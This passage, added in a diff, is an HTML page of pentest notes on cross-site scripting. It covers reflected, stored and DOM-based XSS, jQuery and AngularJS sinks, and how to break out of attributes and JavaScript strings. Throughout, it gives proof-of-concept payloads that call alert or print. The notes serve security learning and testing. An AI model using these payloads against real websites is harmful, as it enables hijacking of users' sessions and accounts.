@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="In-depth XSS pentest notes covering reflected, stored, &amp; DOM-based types. Learn context-specific attacks, exploitation techniques, WAF bypass strategies, &amp; CSP defenses.">
+  <title>offsecnotes | XSS</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>XSS</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#reflected-xss" id="toc-reflected-xss">Reflected XSS</a></li>
+<li><a href="#stored-xss" id="toc-stored-xss">Stored XSS</a></li>
+<li><a href="#dom-based-xss" id="toc-dom-based-xss">DOM-based XSS</a>
+<ul>
+<li><a href="#dom-based-web-message" id="toc-dom-based-web-message">DOM-based web message</a></li>
+<li><a href="#jquery" id="toc-jquery">jQuery</a></li>
+<li><a href="#angularjs" id="toc-angularjs">AngularJS</a></li>
+<li><a href="#reflectedstored-dom-xss" id="toc-reflectedstored-dom-xss">Reflected/Stored DOM XSS</a></li>
+</ul></li>
+<li><a href="#xss-contexts" id="toc-xss-contexts">XSS contexts</a>
+<ul>
+<li><a href="#between-html-tags" id="toc-between-html-tags">Between HTML tags</a></li>
+<li><a href="#in-html-tag-attributes" id="toc-in-html-tag-attributes">In HTML tag attributes</a></li>
+<li><a href="#into-javascript" id="toc-into-javascript">Into JavaScript</a></li>
+</ul></li>
+<li><a href="#bypass-waf" id="toc-bypass-waf">Bypass WAF</a></li>
+<li><a href="#exploitation" id="toc-exploitation">Exploitation</a>
+<ul>
+<li><a href="#steal-cookies" id="toc-steal-cookies">Steal cookies</a></li>
+<li><a href="#capture-passwords" id="toc-capture-passwords">Capture passwords</a></li>
+<li><a href="#perform-csrf" id="toc-perform-csrf">Perform CSRF</a></li>
+</ul></li>
+<li><a href="#content-security-policy" id="toc-content-security-policy">Content security policy</a></li>
+<li><a href="#compress-minify-javascript" id="toc-compress-minify-javascript">Compress &amp; minify JavaScript</a></li>
+</ul></div>
+  <hr>
+<p>Cross-site scripting (XSS) works by manipulating a vulnerable web site so that it returns malicious JavaScript to users.</p>
+<p>XSS cheatsheet: <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger XSS cheat-sheet</a></p>
+<p>More info about Javascript &amp; obfuscation: <a href="/Web/Web%20security/javascript%20and%20obfuscation.html">Javascript &amp; Obfuscation</a></p>
+<blockquote>
+<p><strong>Warning</strong>: Do not use <code>alert(1)</code> -&gt; use <code>alert(document.domain)</code>.</p>
+</blockquote>
+<div class="sourceCode" id="cb1"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">textarea</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;script&quot;</span> <span class="er">onchange</span><span class="ot">=</span><span class="st">(</span><span class="er">&quot;unsafe(this.value)&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">textarea</span><span class="dt">&gt;&lt;</span><span class="kw">br</span><span class="dt">&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;result&quot;</span> <span class="er">sandbox</span><span class="ot">=</span><span class="st">&quot;allow-scripts allow-modals&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="at">session</span> <span class="op">=</span> <span class="st">&quot;secret&quot;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">unsafe</span>(t) {</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">var</span> i <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;result&#39;</span>)<span class="op">;</span> <span class="co">// get the &lt;iframe&gt;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>  i<span class="op">.</span><span class="at">srcdoc</span> <span class="op">=</span> <span class="st">&quot;&lt;body&gt;&lt;script&gt;document.write(&quot;</span><span class="op">+</span>t<span class="op">+</span><span class="st">&quot;);&lt;&quot;</span><span class="op">+</span><span class="st">&quot;/script&gt;&lt;body&gt;&quot;</span><span class="op">;</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<ul>
+<li>Try <code>alert(1)</code> and you see it works… but</li>
+<li><code>alert(document.session)</code> won’t work… why?</li>
+<li><code>alert(window.origin)</code> or <code>alert(document.domain)</code> and you’ll see it’s empty
+<ul>
+<li>this is because the sandboxed iframe also has a different origin. It’s isolated from the website it is embedded into and you cannot steal the secret session.</li>
+</ul></li>
+<li>Use <code>alert(document.domain)</code> or <code>alert(window.origin)</code> instead</li>
+</ul>
+<blockquote>
+<p><strong>Warning</strong>: Do not use <code>&lt;script&gt;</code> tag -&gt; use <code>&lt;img&gt;</code>.</p>
+<p>If your target is using the innerHTML sink, the most common sink vulnerable to DOM XSS so your script might not work as expected. This is because innerHTML won’t render a <code>&lt;script&gt;</code> tag [<a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations">↗</a>]. However, if you use an <code>&lt;img&gt;</code> tag with an onerror attribute instead, the script will execute normally.</p>
+<p>Additionally, if the target sanitizes your payload using a library like DOMPurify, instead of simply encoding it, a <code>&lt;script&gt;</code> tag would be completely stripped out, leaving no visible trace. On the other hand, if you use an <code>&lt;img&gt;</code> tag, DOMPurify will remove the onerror attribute as expected, but the image itself will still be present. You will see the image load (or attempt to load) and the corresponding request in the logs, signaling that further investigation is needed.</p>
+</blockquote>
+<hr />
+<h2 id="reflected-xss">Reflected XSS</h2>
+<p>The malicious script comes from the current HTTP request.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">https://insecure-website.com/search?term=</span><span class="op">&lt;</span>script<span class="op">&gt;</span>alert<span class="er">(</span><span class="ex">document.domain</span><span class="kw">)</span><span class="op">&lt;</span>/script<span class="op">&gt;</span></span></code></pre></div>
+<hr />
+<h2 id="stored-xss">Stored XSS</h2>
+<p>The malicious script comes from the website’s database. POST body example:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="va">comment</span><span class="op">=&lt;</span>script<span class="op">&gt;</span>alert<span class="kw">(</span><span class="ex">document.domain</span><span class="kw">)</span><span class="op">&lt;</span>/script<span class="op">&gt;</span></span></code></pre></div>
+<hr />
+<h2 id="dom-based-xss">DOM-based XSS</h2>
+<p>The vulnerability exists in client-side code rather than server-side code.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">trackSearch</span>(query) {</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">write</span>(<span class="st">&#39;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#39;</span><span class="op">+</span>query<span class="op">+</span><span class="st">&#39;&quot;&gt;&#39;</span>)<span class="op">;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> query <span class="op">=</span> (<span class="kw">new</span> <span class="fu">URLSearchParams</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span>))<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;search&#39;</span>)<span class="op">;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(query) {</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>  <span class="fu">trackSearch</span>(query)<span class="op">;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Get request </span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">https://insecure-website.com/index?search=</span><span class="st">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span></code></pre></div>
+<p><strong>Methodology</strong></p>
+<ol type="1">
+<li>Look for any script that has a sinks</li>
+<li>See if you can control the sink</li>
+<li>Exploit it</li>
+</ol>
+<blockquote>
+<p><strong>Notes</strong>:</p>
+<ol type="1">
+<li><p>Here there are some sources and sinks</p>
+<p>https://github.com/wisec/domxsswiki/wiki</p>
+<p>https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities</p></li>
+<li><p>DOM Invader (Burp Suite tool) is a browser-based tool that helps you test for DOM XSS vulnerabilities using a variety of sources and sinks.</p></li>
+</ol>
+</blockquote>
+<h3 id="dom-based-web-message">DOM-based web message</h3>
+<div class="sourceCode" id="cb7"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Vulnerable website --&gt;</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">window</span><span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&#39;message&#39;</span><span class="op">,</span> <span class="kw">function</span>(e) {</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>        <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;test&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> e<span class="op">.</span><span class="at">data</span><span class="op">;</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    })</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>Exploit</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span> <span class="er">src</span><span class="ot">=</span><span class="st">https://vuln.website/</span> <span class="er">onload</span><span class="ot">=</span><span class="st">&#39;this.contentWindow.postMessage(&quot;</span><span class="er">&lt;</span><span class="st">img src=1 onerror=print()&gt;&quot;,&quot;*&quot;)&#39;</span><span class="dt">&gt;</span></span></code></pre></div>
+<h3 id="jquery">jQuery</h3>
+<p>jQuery’s <code>attr()</code> function can change the attributes of DOM elements</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">$</span>(<span class="kw">function</span>() {</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>    <span class="fu">$</span>(<span class="st">&#39;#backLink&#39;</span>)<span class="op">.</span><span class="fu">attr</span>(<span class="st">&quot;href&quot;</span><span class="op">,</span>(<span class="kw">new</span> <span class="fu">URLSearchParams</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span>))<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;returnUrl&#39;</span>))<span class="op">;</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>Exploit</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">?returnUrl=javascript:alert</span><span class="er">(</span><span class="ex">document.domain</span><span class="kw">)</span></span></code></pre></div>
+<hr />
+<p>jQuery’s <code>$()</code> selector function in another potential sink. If you open the browser console and type <code>$('&lt;img src=x onerror=alert()&gt;')</code> jQuery creates this new element (so the alert will be shown)</p>
+<p>An example:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">$</span>(<span class="bu">window</span>)<span class="op">.</span><span class="fu">on</span>(<span class="st">&#39;hashchange&#39;</span><span class="op">,</span> <span class="kw">function</span>() {</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> element <span class="op">=</span> <span class="fu">$</span>(location<span class="op">.</span><span class="at">hash</span>)<span class="op">;</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>    element[<span class="dv">0</span>]<span class="op">.</span><span class="fu">scrollIntoView</span>()<span class="op">;</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>Exploit</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://vulnerable-website.com#&quot;</span> <span class="er">onload</span><span class="ot">=</span><span class="st">&quot;this.src+=&#39;</span><span class="er">&lt;</span><span class="st">img src=1 onerror=alert(1)&gt;&#39;&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: Recent versions of jQuery have patched this specific vulnerability by preventing HTML injection into a selector if the input begins with a hash (#). But remember, this is just an example, the real problem is how <code>$()</code> selector works .</p>
+</blockquote>
+<h3 id="angularjs">AngularJS</h3>
+<p>When a site uses the <code>ng-app</code> attribute on an HTML element, AngularJS processes it and executes JavaScript inside double curly braces <code>{{ }}</code> in HTML or attributes.</p>
+<p>Consider</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">https://example.com/?search=test</span></span></code></pre></div>
+<div class="sourceCode" id="cb14"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">body</span> <span class="er">ng-app</span><span class="dt">&gt;</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- something --&gt;</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>0 search results for &#39;test&#39;<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- something --&gt;</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><strong>Test</strong></p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">https://example.com/?search=%7B%7B1%2B1%7D%7D</span> <span class="co"># ?search={{1+1}}</span></span></code></pre></div>
+<div class="sourceCode" id="cb16"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">body</span> <span class="er">ng-app</span><span class="dt">&gt;</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- something --&gt;</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>0 search results for &#39;2&#39;<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- something --&gt;</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><strong>Exploit</strong></p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">https://example.comnet/?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="co"># ?search={{$on.constructor(&#39;alert(1)&#39;)()}}</span></span></code></pre></div>
+<div class="sourceCode" id="cb18"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">body</span> <span class="er">ng-app</span><span class="dt">&gt;</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- something --&gt;</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>0 search results for &#39;&#39;<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- something --&gt;</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span></code></pre></div>
+<h3 id="reflectedstored-dom-xss">Reflected/Stored DOM XSS</h3>
+<p>If a script reads data from a URL and writes it to a dangerous sink, the vulnerability is client-side with no server processing.</p>
+<ul>
+<li><strong>Reflected DOM</strong> vulnerabilities happen when the server processes and echoes data from a request, and a script on the page handles this data unsafely, writing it to a dangerous sink.</li>
+</ul>
+<div class="sourceCode" id="cb19"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="pp">eval</span>(<span class="st">&#39;var data = &quot;reflected string&quot;&#39;</span>)<span class="op">;</span></span></code></pre></div>
+<ul>
+<li>In a <strong>stored DOM XSS</strong> vulnerability, the server stores data from one request and includes it in a later response. A script in the later response processes this data unsafely in a sink.</li>
+</ul>
+<div class="sourceCode" id="cb20"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> comment<span class="op">.</span><span class="at">author</span></span></code></pre></div>
+<hr />
+<h2 id="xss-contexts">XSS contexts</h2>
+<h3 id="between-html-tags">Between HTML tags</h3>
+<div class="sourceCode" id="cb21"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">alert</span>(<span class="bu">document</span><span class="op">.</span><span class="at">domain</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span> <span class="er">src</span><span class="ot">=</span><span class="st">1</span> <span class="er">onerror</span><span class="ot">=</span><span class="st">alert(1)</span><span class="dt">&gt;</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: Understand how a payload works</p>
+<ul>
+<li><code>&lt;body onresize="print()"&gt;</code> with this payload (for reflected XSS) you need an exploit server and iframe tag</li>
+</ul>
+</blockquote>
+<h3 id="in-html-tag-attributes">In HTML tag attributes</h3>
+<ul>
+<li><p>Terminate the attribute value, close the tag, and introduce a new one.</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a>&quot;&gt;<span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">alert</span>(<span class="bu">document</span><span class="op">.</span><span class="at">domain</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div></li>
+<li><p>If angle brackets are blocked or encoded, introduce a new attribute that creates a scriptable context.</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>&quot; autofocus onfocus=alert(document.domain) x=&quot;</span></code></pre></div></li>
+<li><p>If XSS context is into the href attribute of an anchor tag, use the javascript pseudo-protocol to execute script</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;javascript:alert(document.domain)&quot;</span><span class="dt">&gt;</span></span></code></pre></div></li>
+<li><p>Access keys allow you to provide keyboard shortcuts that reference a specific element. This is useful in hidden inputs because events like onmouseover and onfocus can’t be triggered due to the element being invisible</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;hidden&quot;</span> <span class="er">accesskey</span><span class="ot">=</span><span class="st">&quot;X&quot;</span> <span class="er">onclick</span><span class="ot">=</span><span class="st">&quot;alert(1)&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb26"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;canonical&quot;</span> <span class="er">accesskey</span><span class="ot">=</span><span class="st">&quot;X&quot;</span> <span class="er">onclick</span><span class="ot">=</span><span class="st">&quot;alert(1)&quot;</span> <span class="dt">/&gt;</span></span></code></pre></div>
+<blockquote>
+<strong>Note</strong>:
+<ul>
+<li>Substitute <code>'</code> <code>"</code> and vice versa</li>
+<li>Space is not needed</li>
+</ul>
+<div class="sourceCode" id="cb27"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;canonical&quot;</span> <span class="er">href</span><span class="ot">=</span><span class="st">&#39;https://website.net/?&#39;</span><span class="er">accesskey</span><span class="ot">=</span><span class="st">&#39;X&#39;</span><span class="er">onclick</span><span class="ot">=</span><span class="st">&#39;alert(1)&#39;</span><span class="dt">/&gt;</span></span></code></pre></div>
+</blockquote>
+<div class="sourceCode" id="cb28"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;canonical&quot;</span> <span class="er">href</span><span class="ot">=</span><span class="st">&#39;https://website.net/?&#39;</span><span class="er">accesskey</span><span class="ot">=</span><span class="st">&#39;X&#39;</span><span class="er">onclick</span><span class="ot">=</span><span class="st">&#39;alert(1)&#39;</span><span class="dt">/&gt;</span></span></code></pre></div></li>
+</ul>
+<h3 id="into-javascript">Into JavaScript</h3>
+<p><strong>Terminating the existing script</strong></p>
+<p>The browser interprets the <code>&lt;/script&gt;</code> sequence within the string as the end of the script block, prematurely stopping the execution of your JavaScript script and generating an error.</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> input <span class="op">=</span> <span class="st">&#39;controllable data here&#39;</span><span class="op">;</span></span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb30"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Payload --&gt;</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;&lt;</span><span class="kw">img</span> <span class="er">src</span><span class="ot">=</span><span class="st">1</span> <span class="er">onerror</span><span class="ot">=</span><span class="st">alert(document.domain)</span><span class="dt">&gt;</span></span></code></pre></div>
+<hr />
+<p><strong>Breaking out of a JavaScript string</strong></p>
+<ul>
+<li><p>It’s essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;-alert(document.domain)-&#39;</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;;alert(document.domain)//</span></span></code></pre></div></li>
+<li><p>Some applications try to escape single quote characters with a backslash but often forget to escape the backslash itself.</p>
+<ul>
+<li><code>';alert(document.domain)//</code> is converted to <code>\';alert(document.domain)//</code></li>
+<li>so your input could be <code>\';alert(document.domain)//</code> which gets converted to <code>\\';alert(document.domain)//</code></li>
+</ul></li>
+<li><p>Making use of HTML-encoding</p>
+<ul>
+<li>When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around input filters.
+<ul>
